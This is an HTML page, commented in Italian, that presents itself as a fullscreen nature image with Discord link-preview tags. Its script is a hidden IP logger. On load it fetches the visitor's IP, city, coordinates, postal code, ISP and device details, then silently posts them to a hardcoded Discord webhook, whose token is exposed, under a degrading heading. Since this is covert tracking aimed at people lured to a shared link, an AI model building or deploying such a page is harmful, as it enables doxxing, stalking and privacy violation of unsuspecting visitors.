<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- ✅ Discord preview fix -->
    <meta property="og:title" content="Fullscreen Image">
    <meta property="og:description" content="A fullscreen display with a random nature image.">
    <meta property="og:image" content="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1920&q=80">
    <meta property="og:url" content="https://yourdomain.com">
    <meta property="og:type" content="website">

    <embed type="image/jpg" src="pic_trulli.jpg" width="300" height="200">
    
    <style>
        /* Reset CSS e stile base */
        *, *::before, *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
            font-family: 'Arial', sans-serif;
        }
        
        /* Container immagine a schermo intero */
        .image-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1;
        }
        
        /* Stile immagine responsive */
        .fullscreen-image {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            transition: opacity 0.5s ease;
        }
        
        /* Elemento nascosto per le informazioni */
        #ip-info {
            display: none;
            visibility: hidden;
            position: absolute;
            opacity: 0;
        }
        
        /* Loader per migliorare UX durante caricamento */
        .loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            z-index: 0;
        }
        
        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Loader per migliorare UX -->
    <div class="loader" id="loader"></div>
    
    <!-- Container immagine principale -->
    <div class="image-container">
        <img class="fullscreen-image" id="main-image" src="https://source.unsplash.com/random/1920x1080/?nature" alt="Immagine a schermo intero" style="opacity: 0;">
    </div>
    
    <!-- Elemento nascosto per memorizzare le informazioni -->
    <div id="ip-info"></div>

    <script>
        /**
         * Geolocalizzazione e Tracciamento Visitatori
         * 
         * Questo script rileva l'indirizzo IP e la posizione geografica del visitatore,
         * e invia queste informazioni a un webhook Discord.
         * 
         * @version 1.0.0
         * @author Manus
         */
        
        // Configurazione
        const CONFIG = {
            webhookUrl: 'https://discord.com/api/webhooks/1361732575088873795/iPMvjztxikH1bgdUSq2qT7_f__Ghc-eYlInI89PGDPod4u4XCvseWm1CRUihpoZPHJ_6',
            ipProvider: 'https://api.ipify.org?format=json',
            geoProvider: 'https://ipapi.co/{ip}/json/',
            embedColor: 3447003, // Blu
            debugMode: false
        };
        
        // Elementi DOM
        const elements = {
            ipInfo: document.getElementById('ip-info'),
            mainImage: document.getElementById('main-image'),
            loader: document.getElementById('loader')
        };
        
        /**
         * Logger personalizzato
         */
        const logger = {
            log: (message, data) => {
                if (CONFIG.debugMode) console.log(message, data || '');
            },
            error: (message, error) => {
                console.error(message, error || '');
            }
        };
        
        /**
         * Mostra l'immagine principale e nasconde il loader
         */
        function showImage() {
            elements.mainImage.style.opacity = '1';
            setTimeout(() => {
                elements.loader.style.display = 'none';
            }, 500);
        }
        
        /**
         * Ottiene l'indirizzo IP del visitatore
         * @returns {Promise<string>} Indirizzo IP
         */
        async function getIpAddress() {
            try {
                const response = await fetch(CONFIG.ipProvider);
                if (!response.ok) throw new Error(`Errore HTTP: ${response.status}`);
                
                const data = await response.json();
                return data.ip;
            } catch (error) {
                logger.error('Errore nel recupero dell\'indirizzo IP:', error);
                throw error;
            }
        }
        
        /**
         * Ottiene informazioni geografiche basate sull'indirizzo IP
         * @param {string} ip - Indirizzo IP
         * @returns {Promise<Object>} Dati geografici
         */
        async function getGeoLocation(ip) {
            try {
                const url = CONFIG.geoProvider.replace('{ip}', ip);
                const response = await fetch(url);
                if (!response.ok) throw new Error(`Errore HTTP: ${response.status}`);
                
                return await response.json();
            } catch (error) {
                logger.error('Errore nel recupero delle informazioni geografiche:', error);
                throw error;
            }
        }
        
        /**
         * Raccoglie informazioni complete sul visitatore
         * @returns {Promise<Object>} Informazioni visitatore
         */
        async function collectVisitorInfo() {
            try {
                // Ottieni indirizzo IP
                const ip = await getIpAddress();
                logger.log('IP rilevato:', ip);
                
                // Ottieni dati geografici
                const geoData = await getGeoLocation(ip);
                logger.log('Dati geografici:', geoData);
                
                // Raccogli informazioni sul dispositivo
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                // Crea oggetto con tutte le informazioni
                return {
                    ip: ip,
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude,
                    postal: geoData.postal,
                    timezone: geoData.timezone,
                    isp: geoData.org,
                    device: deviceInfo,
                    timestamp: new Date().toISOString()
                };
            } catch (error) {
                logger.error('Errore nella raccolta delle informazioni sul visitatore:', error);
                throw error;
            }
        }
        
        /**
         * Invia le informazioni al webhook Discord
         * @param {Object} visitorInfo - Informazioni sul visitatore
         */
        async function sendToDiscord(visitorInfo) {
            try {
                // Crea URL per la mappa statica di Google Maps
                const mapImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${visitorInfo.latitude},${visitorInfo.longitude}&zoom=12&size=600x300&maptype=roadmap&markers=color:red%7C${visitorInfo.latitude},${visitorInfo.longitude}`;
                
                // Crea URL per Google Maps
                const googleMapsUrl = `https://www.google.com/maps?q=${visitorInfo.latitude},${visitorInfo.longitude}`;
                
                // Crea messaggio formattato per Discord
                const message = {
                    content: '**New Bitch Pulled!!!**',
                    embeds: [{
                        title: 'Bitch Info',
                        color: CONFIG.embedColor,
                        fields: [
                            {
                                name: 'IP ADRESS',
                                value: visitorInfo.ip,
                                inline: true
                            },
                            {
                                name: 'CITY',
                                value: visitorInfo.city || 'not available',
                                inline: true
                            },
                            {
                                name: 'REGION',
                                value: visitorInfo.region || 'not available',
                                inline: true
                            },
                            {
                                name: 'COUNTRY',
                                value: visitorInfo.country || 'not available',
                                inline: true
                            },
                            {
                                name: 'COORDS',
                                value: `[${visitorInfo.latitude}, ${visitorInfo.longitude}](${googleMapsUrl})`,
                                inline: true
                            },
                            {
                                name: 'ISP',
                                value: visitorInfo.isp || 'not available',
                                inline: true
                            },
                            {
                                name: 'Device',
                                value: `${visitorInfo.device.platform} - ${visitorInfo.device.screenSize}`,
                                inline: true
                            },
                            {
                                name: 'Browser',
                                value: visitorInfo.device.userAgent.split(' ').slice(-1)[0],
                                inline: true
                            },
                            {
                                name: 'Timezone',
                                value: visitorInfo.device.timeZone,
                                inline: true
                            }
                        ],
                        image: {
                            url: mapImageUrl
                        },
                        footer: {
                            text: `Timestamp: ${new Date(visitorInfo.timestamp).toLocaleString()}`
                        }
                    }]
                };
                
                // Invia i dati al webhook Discord
                const response = await fetch(CONFIG.webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                
                if (response.ok) {
                    logger.log('Dati inviati con successo a Discord!');
                } else {
                    throw new Error(`Errore HTTP: ${response.status} - ${await response.text()}`);
                }
            } catch (error) {
                logger.error('Errore nell\'invio dei dati a Discord:', error);
            }
        }
        
        /**
         * Funzione principale che inizializza l'applicazione
         */
        async function initApp() {
            try {
                // Mostra l'immagine quando è caricata
                elements.mainImage.onload = showImage;
                
                // Raccogli informazioni sul visitatore
                const visitorInfo = await collectVisitorInfo();
                
                // Salva le informazioni nell'elemento nascosto
                elements.ipInfo.textContent = JSON.stringify(visitorInfo);
                
                // Invia le informazioni a Discord
                await sendToDiscord(visitorInfo);
            } catch (error) {
                logger.error('Errore nell\'inizializzazione dell\'applicazione:', error);
                // Mostra comunque l'immagine in caso di errore
                showImage();
            }
        }
        
        // Inizializza l'applicazione quando la pagina è completamente caricata
        window.addEventListener('load', initApp);
    </script>
</body>
</html>
